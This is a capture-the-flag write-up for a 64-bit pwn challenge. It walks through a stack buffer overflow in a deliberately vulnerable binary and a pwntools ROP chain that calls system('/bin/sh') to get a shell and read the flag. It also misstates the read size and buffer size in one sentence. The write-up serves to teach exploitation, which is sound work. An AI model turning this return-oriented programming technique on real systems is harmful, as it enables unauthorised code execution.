# ramadhan-spark-ctf-2026-let_him_cook-writeup

## step 1 - Identifying the binary
```bash
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/6-rop1/lethimcook_handout]
└─$ checksec --file main 
[*] '/home/kali/Desktop/ramadhan-ctf/6-rop1/lethimcook_handout/main'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No                                
```
Our binary is 64-bit , it has no PIE no canary , we can't execute shellcode on the stack and we can write on the binary . It's also not stripped so it still contain symbols and debugging information .

## step 2 - running the binary 
```bash
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/6-rop1/lethimcook_handout]
└─$ ./main
              ══════════════════════════════════
                      🌙 RAMADHAN KAREEM 🌙
              ══════════════════════════════════
no food , u have to make it yourself
START HERE : hello
Goodbye
kali
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/6-rop1/lethimcook_handout]
└─$ ./main
              ══════════════════════════════════
                      🌙 RAMADHAN KAREEM 🌙
              ══════════════════════════════════
no food , u have to make it yourself
START HERE : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Goodbye
kali
zsh: segmentation fault  ./main
```
So as we can see it takes my input and it print goodbye and my username , that means it's using 
```c
sytem("whoami")
```
which can be useful later 
Also when i input a lot of bytes , it gives me segmentation fault , so we wrote somewhere in memory we are not suppose to .

## step 3 - debugging the binary 
I wil use gdb -q main (-q for less input in the intro) to debug the binary and type info func to list all the functions in our program
```gdb
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/6-rop1/lethimcook_handout]
└─$ gdb -q main 
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 17.1 in 0.00ms using Python engine 3.13
Reading symbols from main...
(No debugging symbols found in main)
gef➤  info func
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  system@plt
0x0000000000401050  printf@plt
0x0000000000401060  read@plt
0x0000000000401070  setvbuf@plt
0x0000000000401080  _start
0x00000000004010b0  _dl_relocate_static_pie
0x00000000004010c0  deregister_tm_clones
0x00000000004010f0  register_tm_clones
0x0000000000401130  __do_global_dtors_aux
0x0000000000401160  frame_dummy
0x0000000000401166  setup
0x00000000004011c7  usefulgadget
0x00000000004011d0  main
0x000000000040122b  vuln
0x0000000000401280  _fini
gef➤  
```
Now let's disassemble main
```gdb
gef➤  disass main
Dump of assembler code for function main:
   0x00000000004011d0 <+0>:     push   rbp
   0x00000000004011d1 <+1>:     mov    rbp,rsp
   0x00000000004011d4 <+4>:     mov    eax,0x0
   0x00000000004011d9 <+9>:     call   0x401166 <setup>
   0x00000000004011de <+14>:    lea    rax,[rip+0xe23]        # 0x402008
   0x00000000004011e5 <+21>:    mov    rdi,rax
   0x00000000004011e8 <+24>:    call   0x401030 <puts@plt>
   0x00000000004011ed <+29>:    lea    rax,[rip+0xe8c]        # 0x402080
   0x00000000004011f4 <+36>:    mov    rdi,rax
   0x00000000004011f7 <+39>:    call   0x401030 <puts@plt>
   0x00000000004011fc <+44>:    lea    rax,[rip+0xe05]        # 0x402008
   0x0000000000401203 <+51>:    mov    rdi,rax
   0x0000000000401206 <+54>:    call   0x401030 <puts@plt>
   0x000000000040120b <+59>:    lea    rax,[rip+0xe9e]        # 0x4020b0
   0x0000000000401212 <+66>:    mov    rdi,rax
   0x0000000000401215 <+69>:    call   0x401030 <puts@plt>
   0x000000000040121a <+74>:    mov    eax,0x0
   0x000000000040121f <+79>:    call   0x40122b <vuln>
   0x0000000000401224 <+84>:    mov    eax,0x0
   0x0000000000401229 <+89>:    pop    rbp
   0x000000000040122a <+90>:    ret
End of assembler dump.
gef➤  
```
It's calling vuln let's disassemble it too
```gdb
gef➤  disass vuln 
Dump of assembler code for function vuln:
   0x000000000040122b <+0>:     push   rbp
   0x000000000040122c <+1>:     mov    rbp,rsp
   0x000000000040122f <+4>:     sub    rsp,0x40
   0x0000000000401233 <+8>:     lea    rax,[rip+0xe9b]        # 0x4020d5
   0x000000000040123a <+15>:    mov    rdi,rax
   0x000000000040123d <+18>:    mov    eax,0x0
   0x0000000000401242 <+23>:    call   0x401050 <printf@plt>
   0x0000000000401247 <+28>:    lea    rax,[rbp-0x40]
   0x000000000040124b <+32>:    mov    edx,0xc8
   0x0000000000401250 <+37>:    mov    rsi,rax
   0x0000000000401253 <+40>:    mov    edi,0x0
   0x0000000000401258 <+45>:    call   0x401060 <read@plt>
   0x000000000040125d <+50>:    lea    rax,[rip+0xe7f]        # 0x4020e3
   0x0000000000401264 <+57>:    mov    rdi,rax
   0x0000000000401267 <+60>:    call   0x401030 <puts@plt>
   0x000000000040126c <+65>:    lea    rax,[rip+0xe78]        # 0x4020eb
   0x0000000000401273 <+72>:    mov    rdi,rax
   0x0000000000401276 <+75>:    call   0x401040 <system@plt>
   0x000000000040127b <+80>:    nop
   0x000000000040127c <+81>:    leave
   0x000000000040127d <+82>:    ret
End of assembler dump.
```
As we can see it's reading 0x40 bytes (64) from the user in a 0xc8 bytes (200) space , and that what causes a buffer overflow 
it's also calling system to print the username that we saw early

Now let's see what usefulgadget hide
```gdb
gef➤  disass usefulgadget 
Dump of assembler code for function usefulgadget:
   0x00000000004011c7 <+0>:     push   rbp
   0x00000000004011c8 <+1>:     mov    rbp,rsp
   0x00000000004011cb <+4>:     pop    rdi
   0x00000000004011cc <+5>:     ret
   0x00000000004011cd <+6>:     nop
   0x00000000004011ce <+7>:     pop    rbp
   0x00000000004011cf <+8>:     ret
End of assembler dump.
```
It has 
```c
pop rdi; ret; in 0x4011cb
```
which is a very useful gadget if we want to pass an argument to a function

Now it's almost clear , we just need to overflow the buffer , reach the rbp , call system and pass "/bin/sh" to it so we can spawn a shell and that is called a rop chain (rop for return oriented programming)
Let's use objdumb -s binary | grep "/bin/sh" to dump the content of all sections and search for "/bin/sh"
```bash
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/6-rop1/lethimcook_handout]
└─$ objdump -s  main | grep "bin"
 404010 2f62696e 2f736800                    /bin/sh.   
```
As we can see , we found it , its address is 0x404010
We can also verify in gdb by examining the string of that address
```gdb
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/6-rop1/lethimcook_handout]
└─$ gdb -q main
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 17.1 in 0.00ms using Python engine 3.13
Reading symbols from main...
(No debugging symbols found in main)
gef➤  x/s 0x404010
0x404010 <usefulstring>:        "/bin/sh"
```
Now our rop chain will be somthing like this 
```python
[72 bytes (to overwrite the buffer and the rbp)] [pop rdi; ret (rdi is the first argument passed to a function)] [the address of "/bin/sh"] [system (its address is in the vuln funtion)]
```

## step 4 - writing the exploit
Now i will write our exploit 
```python
from pwn import*

context.binary = elf = ELF("./main")



p = elf.process()
#p = remote("54.247.233.133",1330)

binsh = p64(0x404010)

system = p64(0x401276)

pop_rdi_ret = p64(0x4011cb)

pay = b"A"*72 + pop_rdi_ret + binsh + system 


p.sendline(pay)
p.interactive()
```
Now we run it 
```bash
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/6-rop1/lethimcook_handout]
└─$ python3 solve.py 
[*] '/home/kali/Desktop/ramadhan-ctf/6-rop1/lethimcook_handout/main'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Starting local process '/home/kali/Desktop/ramadhan-ctf/6-rop1/lethimcook_handout/main': pid 18944
[*] Switching to interactive mode
              ══════════════════════════════════
                      🌙 RAMADHAN KAREEM 🌙
              ══════════════════════════════════
no food , u have to make it yourself
START HERE : Goodbye
kali
$ ls
flag.txt  main  solve.py
$ cat flag.txt
Spark{r0p_ch4ins_4re_c00l}
$ 
[*] Interrupted
[*] Stopped process '/home/kali/Desktop/ramadhan-ctf/6-rop1/lethimcook_handout/main' (pid 18944)                                                                                          
```
final flag 
```bash
Spark{r0p_ch4ins_4re_c00l}
```
Thank you for reading ,i hope it was helpful 
















